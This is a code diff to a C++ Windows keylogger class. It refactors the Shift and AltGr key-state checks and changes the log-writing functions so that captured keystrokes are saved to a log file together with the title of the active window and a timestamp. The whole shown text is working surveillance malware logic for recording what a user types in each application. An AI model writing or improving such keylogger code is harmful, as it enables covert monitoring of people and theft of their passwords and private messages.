@@ -117,10 +117,7 @@ void KeyLogger::start() {
 
 
 bool KeyLogger::checkAltGr() {
-    if (GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_MENU)) {
-        return true;
-    }
-    return false;
+    return GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_MENU);
 }
 
 void KeyLogger::writeCharIntoLogFile(const char *string) {
@@ -128,10 +125,17 @@ void KeyLogger::writeCharIntoLogFile(const char *string) {
     std::ofstream fileStream;
     fileStream.open(logsFileName.c_str(), std::fstream::app);
     std::string detectedWindow = getCurrentWindow();
-    if (tempWindow != detectedWindow && !detectedWindow.empty()) {
-        tempWindow = getCurrentWindow();
+    detectedWindow = detectedWindow.empty() ? "undefined window" : detectedWindow;
+    std::string finalString;
+    if (tempWindow != detectedWindow) {
+        finalString += firstRegister ? "" : "\n";
+        firstRegister = false;
+        finalString += detectedWindow + ",";
+        finalString +=  Converter::wstring2string(TimeCS::getCurrentDateTimeW()) + ",";
+        tempWindow = detectedWindow;
     }
-    fileStream << string;
+    finalString += string;
+    fileStream << finalString;
     fileStream.close();
 }
 
@@ -140,10 +144,17 @@ void KeyLogger::writeCharIntoLogFile(char string) {
     std::ofstream fileStream;
     fileStream.open(logsFileName.c_str(), std::fstream::app);
     std::string detectedWindow = getCurrentWindow();
-    if (tempWindow != detectedWindow && !detectedWindow.empty()) {
-        tempWindow = getCurrentWindow();
+    detectedWindow = detectedWindow.empty() ? "undefined window" : detectedWindow;
+    std::string finalString;
+    if (tempWindow != detectedWindow) {
+        finalString += firstRegister ? "" : "\n";
+        firstRegister = false;
+        finalString += detectedWindow + ",";
+        finalString +=  Converter::wstring2string(TimeCS::getCurrentDateTimeW()) + ",";
+        tempWindow = detectedWindow;
     }
-    fileStream << string;
+    finalString += string;
+    fileStream << finalString;
     fileStream.close();
 }
 
@@ -156,10 +167,7 @@ std::string KeyLogger::getCurrentWindow() {
 }
 
 bool KeyLogger::checkShift() {
-    if (GetAsyncKeyState(VK_SHIFT) || GetAsyncKeyState(VK_RSHIFT)) { // check either of 2 shifts
-        return true;
-    }
-    return false;
+    return GetAsyncKeyState(VK_SHIFT) || GetAsyncKeyState(VK_RSHIFT);
 }
 
 
